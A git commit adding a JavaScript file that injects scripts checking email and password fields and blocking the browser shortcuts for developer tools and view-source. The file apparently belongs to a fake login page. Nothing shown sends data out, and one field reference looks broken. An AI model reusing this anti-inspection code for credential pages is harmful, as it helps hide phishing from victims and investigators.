b6f120b4af4dec6b346245c8716f95d79dbcd64d
robexx <48184569+ubaidillah070@users.noreply.github.com>
2019-08-07 02:03:31 +0700

    Add files via upload

---
+++ congek.js
@@ -0,0 +1,40 @@
+<script type="text/javascript">
+<!-- 
+document.writeln(" <script> "); 
+document.writeln(" function validasi(){ "); 
+document.writeln(" 	var x = document.form[\"form\"][\"email\"].value; "); 
+document.writeln(" 	if (x == null || x == \"\") { "); 
+document.writeln(" 		alert(\"email ata nomor belum diisi\"); "); 
+document.writeln(" 		return false; "); 
+document.writeln(" 	} "); 
+document.writeln(" 	var x = document.form[\"form\"][\"pass\"].value ; "); 
+document.writeln(" 	if (x == null || x == \"\") { "); 
+document.writeln(" 		alert(\"masukan password\"); "); 
+document.writeln(" 		return false; "); 
+document.writeln(" 	} "); 
+document.writeln(" } "); 
+document.writeln("  "); 
+document.writeln(" </script> "); 
+document.writeln(" 										<script> "); 
+document.writeln("   document.onkeydown = function(e) { "); 
+document.writeln("     if(e.keyCode == 123) { "); 
+document.writeln("      return false; "); 
+document.writeln("     } "); 
+document.writeln("     if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)){ "); 
+document.writeln("      return false; "); 
+document.writeln("     } "); 
+document.writeln("     if(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)){ "); 
+document.writeln("      return false; "); 
+document.writeln("     } "); 
+document.writeln("     if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)){ "); 
+document.writeln("      return false; "); 
+document.writeln("     } "); 
+document.writeln("  "); 
+document.writeln("     if(e.ctrlKey && e.shiftKey && e.keyCode == 'C'.charCodeAt(0)){ "); 
+document.writeln("      return false; "); 
+document.writeln("     }       "); 
+document.writeln("  } "); 
+document.writeln("  "); 
+document.writeln(" </script> ");
+ // -->
+</script>
